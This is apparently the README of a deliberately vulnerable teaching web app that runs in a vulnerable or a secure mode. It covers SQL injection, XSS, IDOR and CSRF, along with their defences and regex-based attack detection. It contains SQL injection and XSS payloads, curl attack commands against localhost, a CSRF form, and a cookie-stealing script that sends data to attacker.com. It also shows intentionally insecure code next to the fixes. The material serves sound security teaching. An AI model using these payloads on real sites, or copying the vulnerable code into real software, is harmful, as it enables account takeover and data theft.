# 🔐 Web Security Lab - Complete Educational Platform

A comprehensive, hands-on educational platform for learning web security concepts including attack vectors, detection mechanisms, and defense strategies.

> ⚠️ **DISCLAIMER**: This lab is for **educational purposes only**. Never use these techniques on systems you don't own or have explicit permission to test. Unauthorized access to computer systems is illegal.

---

## 📋 Table of Contents

- [Overview](#overview)
- [Features](#features)
- [Quick Start](#quick-start)
- [Architecture](#architecture)
- [Part 1: Building a Robust Website](#part-1-building-a-robust-website)
- [Part 2: Attack Vectors (Educational)](#part-2-attack-vectors-educational)
- [Part 3: Attack Detection](#part-3-attack-detection)
- [Part 4: Prevention & Best Practices](#part-4-prevention--best-practices)
- [API Reference](#api-reference)
- [Exercises](#exercises)
- [Resources](#resources)

---

## Overview

This security lab provides a dual-mode web application that can run in either **VULNERABLE** or **SECURE** mode, allowing you to:

1. **Learn how attacks work** by exploiting vulnerabilities in a safe environment
2. **Understand defenses** by seeing how the same attacks are blocked in secure mode
3. **Practice detection** by analyzing security logs and attack patterns
4. **Apply best practices** through hands-on implementation

### What You'll Learn

| Topic | Description |
|-------|-------------|
| SQL Injection | How attackers manipulate database queries |
| Cross-Site Scripting (XSS) | Injecting malicious scripts into web pages |
| IDOR | Accessing unauthorized resources via ID manipulation |
| CSRF | Tricking users into performing unwanted actions |
| Authentication Bypass | Circumventing login mechanisms |
| Security Headers | Protecting against various attack vectors |
| Rate Limiting | Preventing brute force attacks |
| Input Validation | Sanitizing user input |
| Output Encoding | Preventing script injection |
| Security Logging | Detecting and monitoring attacks |

---

## Features

### Dual-Mode Operation

```
┌─────────────────────────────────────────────────────────────┐
│                    VULNERABLE MODE                          │
│  • SQL queries use string concatenation                     │
│  • No input validation or output encoding                   │
│  • No rate limiting                                         │
│  • Verbose error messages                                   │
│  • No security headers                                      │
│  • Cookies accessible via JavaScript                        │
└─────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────┐
│                      SECURE MODE                            │
│  • Parameterized queries (prepared statements)              │
│  • Input validation & output encoding                       │
│  • Rate limiting (100 req/15min, 5 login attempts)          │
│  • Generic error messages                                   │
│  • Full security headers (CSP, X-Frame-Options, etc.)       │
│  • HttpOnly, Secure, SameSite cookies                       │
│  • Attack pattern detection & blocking                      │
└─────────────────────────────────────────────────────────────┘
```

### Interactive Web Interface

- Real-time mode indicator
- Pre-built attack payloads (click to use)
- Live security log viewer
- Educational explanations for each vulnerability
- Code examples showing vulnerable vs secure implementations

---

## Quick Start

### Prerequisites

- Node.js 18+ 
- npm 8+

### Installation

```bash
# Clone the repository
git clone https://github.com/rock0ne/testing-websites.git
cd testing-websites/security-lab

# Install dependencies
npm install
```

### Running the Lab

```bash
# Run in VULNERABLE mode (for learning attacks)
SECURE_MODE=false node server.js

# Run in SECURE mode (for learning defenses)
SECURE_MODE=true node server.js

# Or use npm scripts
npm run vulnerable  # Vulnerable mode
npm run secure      # Secure mode
```

### Access the Lab

- **Web Interface**: http://localhost:12000
- **API Base URL**: http://localhost:12000/api

### Test Credentials

| Username | Password | Role | Description |
|----------|----------|------|-------------|
| `admin` | `admin_secret_2024` | admin | Full access to admin panel |
| `alice` | `password123` | user | Regular user account |
| `bob` | `password123` | user | Regular user account |

---

## Architecture

```
security-lab/
├── server.js           # Main application server
├── package.json        # Dependencies and scripts
├── public/
│   └── index.html      # Interactive web interface
├── logs/
│   ├── security.log    # Security event logs
│   └── error.log       # Error logs
└── SECURITY_GUIDE.md   # Detailed documentation
```

### Technology Stack

| Component | Technology | Purpose |
|-----------|------------|---------|
| Backend | Express.js | Web server framework |
| Database | SQLite (better-sqlite3) | In-memory database |
| Sessions | express-session | Session management |
| Security | Helmet.js | Security headers |
| Rate Limiting | express-rate-limit | Brute force protection |
| Password Hashing | bcryptjs | Secure password storage |
| Logging | Winston | Security event logging |
| Validation | express-validator | Input validation |

---

## Part 1: Building a Robust Website

### 1.1 Security Headers with Helmet.js

Security headers protect against various attacks:

```javascript
const helmet = require('helmet');

app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],           // Only load resources from same origin
      scriptSrc: ["'self'"],            // Prevent inline scripts (XSS protection)
      styleSrc: ["'self'", "'unsafe-inline'"],
      imgSrc: ["'self'", "data:"],
      connectSrc: ["'self'"],
      frameSrc: ["'none'"],             // Prevent clickjacking
    },
  },
}));
```

**Headers Added:**

| Header | Purpose |
|--------|---------|
| `Content-Security-Policy` | Controls which resources can be loaded |
| `X-Frame-Options` | Prevents clickjacking attacks |
| `X-Content-Type-Options` | Prevents MIME type sniffing |
| `Strict-Transport-Security` | Forces HTTPS connections |
| `X-XSS-Protection` | Enables browser XSS filter |
| `Referrer-Policy` | Controls referrer information |

### 1.2 Rate Limiting

Prevents brute force and denial-of-service attacks:

```javascript
const rateLimit = require('express-rate-limit');

// General rate limit
const limiter = rateLimit({
  windowMs: 15 * 60 * 1000,  // 15 minutes
  max: 100,                   // 100 requests per window
  message: { error: 'Too many requests, please try again later.' }
});
app.use(limiter);

// Stricter limit for login attempts
const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 5,                     // Only 5 login attempts per 15 minutes
  message: { error: 'Too many login attempts, please try again later.' }
});
app.use('/api/login', loginLimiter);
```

### 1.3 Secure Session Management

```javascript
const session = require('express-session');
const crypto = require('crypto');

app.use(session({
  secret: crypto.randomBytes(32).toString('hex'),  // Random secret
  resave: false,
  saveUninitialized: false,
  cookie: {
    secure: true,       // Only send over HTTPS
    httpOnly: true,     // Prevent JavaScript access (XSS protection)
    sameSite: 'strict', // Prevent CSRF attacks
    maxAge: 3600000     // 1 hour expiry
  }
}));
```

### 1.4 Password Security

```javascript
const bcrypt = require('bcryptjs');

// Hashing a password (registration)
const saltRounds = 12;
const hashedPassword = await bcrypt.hash(plainPassword, saltRounds);

// Verifying a password (login)
const isValid = await bcrypt.compare(inputPassword, storedHash);
```

### 1.5 Input Validation

```javascript
function validateInput(input, type) {
  const patterns = {
    username: /^[a-zA-Z0-9_]{3,20}$/,      // Alphanumeric + underscore, 3-20 chars
    email: /^[^\s@]+@[^\s@]+\.[^\s@]+$/,   // Basic email format
    alphanumeric: /^[a-zA-Z0-9\s]+$/       // Letters, numbers, spaces only
  };
  return patterns[type]?.test(input) ?? false;
}
```

### 1.6 Output Encoding (XSS Prevention)

```javascript
function escapeHtml(text) {
  if (!text) return '';
  const map = {
    '&': '&amp;',
    '<': '&lt;',
    '>': '&gt;',
    '"': '&quot;',
    "'": '&#039;'
  };
  return text.toString().replace(/[&<>"']/g, m => map[m]);
}

// Usage
const safeContent = escapeHtml(userInput);
```

---

## Part 2: Attack Vectors (Educational)

### 2.1 SQL Injection

**What is it?**
SQL injection occurs when user input is directly concatenated into SQL queries, allowing attackers to manipulate query logic.

**Vulnerable Code:**
```javascript
// ❌ NEVER DO THIS - String concatenation
const query = `SELECT * FROM users WHERE username = '${username}' AND password = '${password}'`;
db.prepare(query).get();
```

**Secure Code:**
```javascript
// ✅ ALWAYS USE THIS - Parameterized queries
const user = db.prepare('SELECT * FROM users WHERE username = ?').get(username);
```

#### Attack Examples

**1. Authentication Bypass**
```
Username: admin'--
Password: anything

Resulting query:
SELECT * FROM users WHERE username = 'admin'--' AND password = 'anything'
                                            ↑
                                    Comments out password check!
```

**2. Always True Condition**
```
Username: ' OR '1'='1'--
Password: x

Resulting query:
SELECT * FROM users WHERE username = '' OR '1'='1'--' AND password = 'x'
                                           ↑
                                    Always true, returns first user!
```

**3. UNION-based Data Extraction**
```
Search: ' UNION SELECT id, username, password, role, created_at FROM users--

This extracts password hashes from the database!
```

**Try it in the lab:**
```bash
# Authentication bypass
curl -X POST http://localhost:12000/api/login \
  -H "Content-Type: application/json" \
  -d '{"username": "admin'\''--", "password": "x"}'

# Extract all passwords
curl "http://localhost:12000/api/users/search?q=' UNION SELECT id, username, password, role, created_at FROM users--"
```

---

### 2.2 Cross-Site Scripting (XSS)

**What is it?**
XSS allows attackers to inject malicious scripts that execute in other users' browsers.

**Types of XSS:**

| Type | Description | Persistence |
|------|-------------|-------------|
| Reflected | Payload in URL/request, reflected immediately | None |
| Stored | Payload saved in database | Permanent |
| DOM-based | Payload manipulates client-side JavaScript | Varies |

#### Attack Payloads

**1. Basic Alert (Testing)**
```html
<script>alert('XSS!')</script>
```

**2. Cookie Stealing**
```html
<script>
fetch('https://attacker.com/steal?cookie=' + document.cookie)
</script>
```

**3. Event Handler Injection**
```html
<img src=x onerror="alert('XSS')">
<div onmouseover="alert('XSS')">Hover me</div>
<body onload="alert('XSS')">
```

**4. JavaScript Protocol**
```html
<a href="javascript:alert('XSS')">Click me</a>
```

**5. SVG Injection**
```html
<svg onload="alert('XSS')">
```

**Prevention:**
```javascript
// 1. Output encoding
const safeContent = escapeHtml(userInput);

// 2. Content Security Policy header
Content-Security-Policy: script-src 'self'

// 3. HttpOnly cookies (prevents JavaScript access)
cookie: { httpOnly: true }
```

---

### 2.3 Insecure Direct Object Reference (IDOR)

**What is it?**
IDOR occurs when an application exposes internal object references (like database IDs) without proper authorization checks.

**Vulnerable Code:**
```javascript
// ❌ No authorization check - any user can access any profile
app.get('/api/users/:id', (req, res) => {
  const user = db.prepare('SELECT * FROM users WHERE id = ?').get(req.params.id);
  res.json({ user });
});
```

**Secure Code:**
```javascript
// ✅ Proper authorization check
app.get('/api/users/:id', requireAuth, (req, res) => {
  // Only allow users to view their own profile, or admins to view all
  if (req.session.userId != req.params.id && req.session.role !== 'admin') {
    logSecurityEvent('IDOR_ATTEMPT', req, `User ${req.session.userId} tried to access user ${req.params.id}`);
    return res.status(403).json({ error: 'Access denied' });
  }
  const user = db.prepare('SELECT * FROM users WHERE id = ?').get(req.params.id);
  res.json({ user });
});
```

**Attack Example:**
```bash
# As alice (user ID 2), try to access admin's profile (user ID 1)
curl http://localhost:12000/api/users/1 \
  -H "Cookie: connect.sid=ALICE_SESSION_COOKIE"
```

---

### 2.4 Cross-Site Request Forgery (CSRF)

**What is it?**
CSRF tricks authenticated users into performing unwanted actions by exploiting their active session.

**Attack Scenario:**
```html
<!-- Malicious page on attacker's website -->
<html>
<body onload="document.getElementById('evil').submit()">
  <form id="evil" action="https://bank.com/transfer" method="POST">
    <input type="hidden" name="to" value="attacker_account">
    <input type="hidden" name="amount" value="10000">
  </form>
</body>
</html>
```

**Prevention Methods:**

```javascript
// 1. SameSite cookies
cookie: { sameSite: 'strict' }

// 2. CSRF tokens
const csrf = require('csurf');
app.use(csrf({ cookie: true }));

// In your form:
<input type="hidden" name="_csrf" value="{{csrfToken}}">

// 3. Verify Origin/Referer headers
if (req.headers.origin !== 'https://yoursite.com') {
  return res.status(403).json({ error: 'Invalid origin' });
}
```

---

## Part 3: Attack Detection

### 3.1 Pattern-Based Detection

The lab includes a detection system that identifies common attack patterns:

```javascript
const ATTACK_PATTERNS = {
  SQL_INJECTION: [
    /(\b(SELECT|INSERT|UPDATE|DELETE|DROP|UNION|ALTER)\b)/i,
    /('|"|;|--|\*|\/\*|\*\/)/,
    /(\bOR\b|\bAND\b).*?[=<>]/i,
    /\b(1=1|1='1'|'='|"=")\b/i
  ],
  XSS: [
    /<script\b[^>]*>/i,
    /javascript:/i,
    /on\w+\s*=/i,
    /<iframe\b/i,
    /<img\b[^>]*\bonerror\b/i
  ],
  PATH_TRAVERSAL: [
    /\.\.\//,
    /\.\.\\/, 
    /%2e%2e/i
  ],
  COMMAND_INJECTION: [
    /[;&|`$]/,
    /\$\(/,
    /`.*`/
  ]
};

function detectAttackPatterns(input, req) {
  for (const [attackType, patterns] of Object.entries(ATTACK_PATTERNS)) {
    for (const pattern of patterns) {
      if (pattern.test(input)) {
        logSecurityEvent(`ATTACK_DETECTED_${attackType}`, req, 
          `Suspicious input: ${input.substring(0, 100)}`);
        return attackType;
      }
    }
  }
  return null;
}
```

### 3.2 Security Logging

All security events are logged for analysis:

```javascript
const winston = require('winston');

const logger = winston.createLogger({
  level: 'info',
  format: winston.format.combine(
    winston.format.timestamp(),
    winston.format.json()
  ),
  transports: [
    new winston.transports.File({ filename: 'logs/security.log' }),
    new winston.transports.File({ filename: 'logs/error.log', level: 'error' }),
    new winston.transports.Console()
  ]
});

function logSecurityEvent(eventType, req, details) {
  const logEntry = {
    event_type: eventType,
    ip_address: req.ip,
    user_agent: req.get('User-Agent'),
    details: details,
    timestamp: new Date().toISOString()
  };
  
  logger.warn(`SECURITY EVENT: ${eventType}`, logEntry);
  
  // Also store in database for analysis
  db.prepare(`
    INSERT INTO security_logs (event_type, ip_address, user_agent, details)
    VALUES (?, ?, ?, ?)
  `).run(eventType, logEntry.ip_address, logEntry.user_agent, details);
}
```

### 3.3 Anomaly Indicators

Watch for these suspicious patterns:

| Indicator | Description | Severity |
|-----------|-------------|----------|
| Multiple failed logins | Same IP, different usernames | High |
| SQL keywords in input | SELECT, UNION, DROP, etc. | High |
| HTML/JS in text fields | Script tags, event handlers | High |
| Sequential ID access | Enumerating user IDs | Medium |
| High request frequency | Possible DoS or scraping | Medium |
| Unusual User-Agent | Automated tools | Low |
| Off-hours activity | Requests at unusual times | Low |

---

## Part 4: Prevention & Best Practices

### Defense in Depth Checklist

```
Security Layer Checklist
========================

□ INPUT VALIDATION
  □ Whitelist allowed characters
  □ Validate data types and lengths
  □ Reject unexpected input formats
  □ Sanitize before storage

□ OUTPUT ENCODING
  □ HTML encode for HTML context
  □ JavaScript encode for JS context
  □ URL encode for URL context
  □ CSS encode for style context

□ AUTHENTICATION
  □ Strong password requirements (12+ chars, complexity)
  □ Account lockout after failed attempts
  □ Multi-factor authentication (MFA)
  □ Secure password storage (bcrypt, Argon2)
  □ Session timeout and regeneration

□ AUTHORIZATION
  □ Principle of least privilege
  □ Role-based access control (RBAC)
  □ Verify permissions on every request
  □ Don't trust client-side checks

□ SESSION MANAGEMENT
  □ Secure, HttpOnly, SameSite cookies
  □ Session timeout (1 hour recommended)
  □ Regenerate session ID on login
  □ Invalidate sessions on logout

□ SECURITY HEADERS
  □ Content-Security-Policy
  □ X-Frame-Options: DENY
  □ X-Content-Type-Options: nosniff
  □ Strict-Transport-Security
  □ Referrer-Policy

□ DATABASE SECURITY
  □ Parameterized queries (ALWAYS)
  □ Least privilege database user
  □ Encrypted connections (TLS)
  □ Regular backups

□ LOGGING & MONITORING
  □ Log all security events
  □ Monitor for anomalies
  □ Alert on suspicious activity
  □ Regular log review

□ ERROR HANDLING
  □ Generic error messages to users
  □ Detailed logs for developers
  □ No stack traces in production
  □ Custom error pages

□ INFRASTRUCTURE
  □ HTTPS everywhere
  □ Keep dependencies updated
  □ Regular security audits
  □ Web Application Firewall (WAF)
```

### Secure Coding Patterns

**Database Queries:**
```javascript
// ❌ VULNERABLE - String concatenation
const query = `SELECT * FROM users WHERE id = ${userId}`;

// ✅ SECURE - Parameterized query
const user = db.prepare('SELECT * FROM users WHERE id = ?').get(userId);

// ✅ SECURE - Named parameters
const user = db.prepare('SELECT * FROM users WHERE id = $id').get({ id: userId });
```

**API Responses:**
```javascript
// ❌ VULNERABLE - Exposing sensitive data
res.json({ user: user });  // Might include password hash!

// ✅ SECURE - Explicit field selection
res.json({
  user: {
    id: user.id,
    username: user.username,
    email: user.email
    // Never include: password, passwordHash, internalId, etc.
  }
});
```

**Error Handling:**
```javascript
// ❌ VULNERABLE - Detailed errors
catch (err) {
  res.status(500).json({ error: err.message, stack: err.stack });
}

// ✅ SECURE - Generic errors + logging
catch (err) {
  logger.error('Database error', { error: err.message, stack: err.stack });
  res.status(500).json({ error: 'An error occurred' });
}
```

---

## API Reference

### Authentication

| Endpoint | Method | Description | Auth Required |
|----------|--------|-------------|---------------|
| `/api/login` | POST | User login | No |
| `/api/logout` | POST | User logout | Yes |
| `/api/user` | GET | Get current user | No |

### Users

| Endpoint | Method | Description | Auth Required |
|----------|--------|-------------|---------------|
| `/api/users/search?q=` | GET | Search users | No |
| `/api/users/:id` | GET | Get user by ID | Yes |
| `/api/profile/update` | POST | Update profile | Yes |

### Posts

| Endpoint | Method | Description | Auth Required |
|----------|--------|-------------|---------------|
| `/api/posts` | GET | List all posts | No |
| `/api/posts` | POST | Create post | Yes |
| `/api/posts/:id/comments` | GET | Get comments | No |
| `/api/posts/:id/comments` | POST | Add comment | Yes |

### Admin

| Endpoint | Method | Description | Auth Required |
|----------|--------|-------------|---------------|
| `/api/admin/users` | GET | List all users | Admin |
| `/api/admin/logs` | GET | View security logs | Admin |

### Security

| Endpoint | Method | Description | Auth Required |
|----------|--------|-------------|---------------|
| `/api/mode` | GET | Check security mode | No |
| `/api/security/logs` | GET | View security logs | No |
| `/api/security/logs` | DELETE | Clear logs | No |

---

## Exercises

### Exercise 1: SQL Injection

**Objective:** Bypass authentication and extract sensitive data

1. Start the server in vulnerable mode: `SECURE_MODE=false node server.js`
2. Try to login as admin without knowing the password
   - Use payload: `admin'--` as username
3. Extract all user passwords using UNION injection
   - Search: `' UNION SELECT id, username, password, role, created_at FROM users--`
4. Switch to secure mode and verify the attacks fail
5. Examine the code to understand the difference

### Exercise 2: Cross-Site Scripting (XSS)

**Objective:** Inject and execute malicious scripts

1. Login as any user (alice/password123)
2. Create a post with XSS payload: `<script>alert('XSS!')</script>`
3. Refresh the posts list and observe script execution
4. Try different payloads:
   - `<img src=x onerror="alert('XSS')">`
   - `<div onmouseover="alert('XSS')">Hover me</div>`
5. Switch to secure mode and verify encoding works

### Exercise 3: IDOR (Insecure Direct Object Reference)

**Objective:** Access unauthorized user data

1. Login as alice (user ID 2)
2. Try to access admin's profile: `GET /api/users/1`
3. Try to access bob's profile: `GET /api/users/3`
4. In vulnerable mode, you can see all profiles
5. Switch to secure mode and verify access is denied

### Exercise 4: Attack Detection

**Objective:** Understand how attacks are detected

1. Perform various attacks (SQL injection, XSS)
2. Check the security logs: `GET /api/security/logs`
3. Identify which attacks were detected
4. Understand the detection patterns
5. Try to craft payloads that evade detection

### Exercise 5: Secure Mode Comparison

**Objective:** Compare vulnerable vs secure implementations

1. Run both modes side by side (different ports)
2. Try the same attacks on both
3. Compare the responses
4. Examine the code differences
5. Document what makes the secure version safe

---

## Resources

### Official Documentation

- [OWASP Top 10](https://owasp.org/www-project-top-ten/) - Most critical web security risks
- [OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/) - Security best practices
- [MDN Web Security](https://developer.mozilla.org/en-US/docs/Web/Security) - Web security fundamentals

### Learning Platforms

- [PortSwigger Web Security Academy](https://portswigger.net/web-security) - Free, comprehensive training
- [HackTheBox](https://www.hackthebox.com/) - Hands-on hacking challenges
- [TryHackMe](https://tryhackme.com/) - Guided cybersecurity training
- [OWASP WebGoat](https://owasp.org/www-project-webgoat/) - Deliberately insecure application

### Tools

- [Burp Suite](https://portswigger.net/burp) - Web security testing
- [OWASP ZAP](https://www.zaproxy.org/) - Open source security scanner
- [SQLMap](https://sqlmap.org/) - Automatic SQL injection tool
- [Nikto](https://cirt.net/Nikto2) - Web server scanner

### Books

- "The Web Application Hacker's Handbook" by Dafydd Stuttard
- "OWASP Testing Guide" - Free online resource
- "Real-World Bug Hunting" by Peter Yaworski

---

## Contributing

Contributions are welcome! Please feel free to submit issues and pull requests.

### Guidelines

1. Keep educational focus - explain why, not just how
2. Add both vulnerable and secure code examples
3. Include detection mechanisms for new attack vectors
4. Update documentation for any new features

---

## License

This project is for educational purposes only. Use responsibly and ethically.

---

## Acknowledgments

- OWASP Foundation for security guidelines
- The security research community
- All contributors to this educational project

---

**Remember:** With great power comes great responsibility. Use your security knowledge to protect, not to harm. 🛡️